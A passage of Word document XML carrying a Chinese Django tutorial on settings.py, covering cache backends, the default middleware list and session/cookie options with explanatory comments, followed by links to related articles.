        </w:rPr>
        <w:t xml:space="preserve">        'BACKEND': 'django.core.cache.backends.db.DatabaseCache',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="557C2427" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'LOCATION': 'my_cache_table',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="753AE431" w14:textId="266395F2" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F512DA6" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>文件系统缓存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A107839" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>CACHES = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07988946" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    'default': {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30708243" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'BACKEND': 'django.core.cache.backends.filebased.FileBasedCache',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D678093" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'LOCATION': '/var/tmp/django_cache',#这个是文件夹的路径</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77FECA66" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        #'LOCATION': 'c:\foo\bar',#windows下的示例</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BB01F59" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DDBD032" w14:textId="04A7929C" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74CF0DD7" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>本地内存缓存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A1EE4F6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>CACHES = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="790BAB9F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    'default': {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B8EDC94" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'BACKEND': 'django.core.cache.backends.locmem.LocMemCache',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78CEFADE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'LOCATION': 'unique-snowflake'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0584F943" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4652DEBA" w14:textId="377B053E" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09D8A1E4" w14:textId="576A4469" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>阅读更多: </w:t>
      </w:r>
      <w:hyperlink r:id="rId291" w:anchor="wechat_redirect" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00230D30">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Django基础(8): 缓存Cache应用场景及工作原理，Cache设置及如何使用</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="56C761E6" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>中间件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C0F5E36" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>MIDDLEWARE = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B64C9D1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    'django.middleware.security.SecurityMiddleware',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52B2965C"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'django.contrib.sessions.middleware.SessionMiddleware',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18E33967" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    'django.middleware.common.CommonMiddleware',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75B9494C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    'django.middleware.csrf.CsrfViewMiddleware',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41922B50"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'django.contrib.auth.middleware.AuthenticationMiddleware',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DB28E23" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    'django.contrib.messages.middleware.MessageMiddleware',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="303EF4F7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    'django.middleware.clickjacking.XFrameOptionsMiddleware',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="342A397F" w14:textId="6603862A" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56DC43D9" w14:textId="3035CCB9" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>COOKIE与SESSION设置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B23C3FB" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>SESSION_ENGINE = 'django.contrib.sessions.backends.db'  # 引擎（默认）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06226075" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>SESSION_COOKIE_NAME = "sessionid"  # Session的cookie保存在浏览器上时的key，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FDB2E09" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>SESSION_COOKIE_PATH = "/"  # Session的cookie保存的路径（默认）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4681FEB0" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>SESSION_COOKIE_DOMAIN = None  # Session的cookie保存的域名（默认）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="041483AD" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>SESSION_COOKIE_SECURE = False  # 是否Https传输cookie（默认）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="220C403E" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>SESSION_COOKIE_HTTPONLY = True  # 是否Session的cookie只支持http传输（默认）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B094D6F" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>SESSION_COOKIE_AGE = 60 * 30  # Session的cookie失效日期（30min）（默认）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EEC7D08" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>SESSION_EXPIRE_AT_BROWSER_CLOSE = True  # 是否关闭浏览器使得Session过期（默认）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4733FB5F" w14:textId="2DB2D59D" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>SESSION_SAVE_EVERY_REQUEST = True  # 是否每次请求都保存Session，默认修改之后才保存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54612FFF" w14:textId="77777777" w:rsidR="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>阅读更多: </w:t>
      </w:r>
      <w:hyperlink r:id="rId292" w:anchor="wechat_redirect" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00230D30">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Django基础(7): cookie和session应用场景及如何使用</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="04BC31BC" w14:textId="2F7B1CA9" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>小结</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42716991" w14:textId="67977EA9" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>本文深入解读了Django配置文件settings.py中的常用各个选项以及配置过程中的注意事项，希望对大家有所帮助。注意: 在正式部署自己的django项目时一定要注意修改settings.py。喜欢本文别忘了加入微信收藏哦。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13EBACC8" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>大江狗</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="295CDD3E" w14:textId="42740103" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2019.3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F03DCA8" w14:textId="3BAA2983" w:rsidR="001C47AF" w:rsidRDefault="003802BB" w:rsidP="003802BB">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050</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="27"/>
          <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:hyperlink r:id="rId293" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF" w:rsidRPr="003802BB">
          <w:rPr>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:b/>
            <w:color w:val="4D4D4D"/>
            <w:sz w:val="30"/>
            <w:szCs w:val="27"/>
            <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
          </w:rPr>
          <w:t>Django基础(26): 常用装饰器应用场景及正确使用方法</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3027E931" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django基础(26): 常用装饰器应用场景及正确使用方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0629C749" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
